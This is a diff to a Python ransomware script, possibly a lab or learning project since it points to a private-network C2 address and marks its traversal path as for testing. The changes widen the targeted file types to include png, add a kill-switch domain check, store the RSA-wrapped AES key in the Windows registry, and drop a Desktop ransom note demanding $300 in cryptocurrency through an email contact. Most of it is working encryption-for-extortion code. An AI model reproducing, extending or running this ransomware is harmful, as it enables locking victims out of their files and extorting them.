@@ -17,7 +17,7 @@ from tempfile import NamedTemporaryFile
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.Random import get_random_bytes
 
-tgt_exts = ['txt']
+tgt_exts = ['txt', 'png']
 REMOTE_C2='http://192.168.230.128:9000'
 PUBLIC_KEY='''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhgXKdG6b2S3AjafAdmc
@@ -30,6 +30,14 @@ MQIDAQAB
 -----END PUBLIC KEY-----'''
 
 def main():
+    # Check if killswitch domain registered:
+    try:
+        d = get('https://666examplenotfoundhere0x0x0x0.org')
+        if d.status_code == 200:
+            print('Kill switch: Exiting..')
+            return
+    except: pass
+
     # Generate AES session key
     aes = get_random_bytes(16)
 
@@ -47,8 +55,7 @@ def main():
     # Encrypt AES key with public RSA key
     c_rsa = PKCS1_OAEP.new(public)
     enc_aes = c_rsa.encrypt(aes)
-    # Testing
-    print('Encrypted AES key: ' + str(enc_aes))
+    #print('\tEncrypted AES key: ' + str(enc_aes)) # Testing
     
     # Traverse system, encrypt files with AES session key using algorithm
     traverse_path = os.getcwd() # Start of traverse path -- FOR TESTING
@@ -78,16 +85,41 @@ def main():
     with NamedTemporaryFile(dir=cwd) as tmpf:
         tmpf.write(enc_aes)
         f_path = tmpf.name
-    # Write encrypted session key tempfile to registry before deleting
+    # Write encrypted session key (in b64) tempfile to registry before deleting
         try:
             key = reg.CreateKey(r_key, f_path)
-            reg.SetValue(key, 'NO-ACCESS', reg.REG_SZ, str(enc_aes))
+            reg.SetValue(key, 'NO-ACCESS', reg.REG_SZ, str(b64encode(enc_aes)))
             if key:
                 reg.CloseKey(key)
         except Exception as e:
             print('\tError writing to registry: ' + e)
 
         tmpf.flush()
+
+    # Show ransom message
+    r_msg='''Oh no, your files are encrypted!
+It look like you won't be able to access quite a few of them. However,
+we can guarantee you can get them back, if you do the following. 
+
+    1. Send a payment worth $300 to the crypto wallet: 
+
+        bc1xxxxxxxxxxxxxxxxxxxxxxx
+
+
+    2. Send your crypto wallet ID & personal key to e-mail: xxxxx@posteo.net
+
+        Your personal key:
+            %s
+
+
+You will receive a Decryption software in the inbox of the email used to send your key. 
+Once run, all your files will be successfully restored. Failure to follow these steps may
+result in your files being lost forever.
+Thank you!''' % (str(b64encode(aes)))
+
+    with open(os.path.expanduser('~')+'\\Desktop\\YOUR-FILES-ARE-ENCRYPTED.txt', 'w') as f:
+        f.write(r_msg)
+        f.flush()
     print("Job Done")
 
 if __name__ == '__main__':
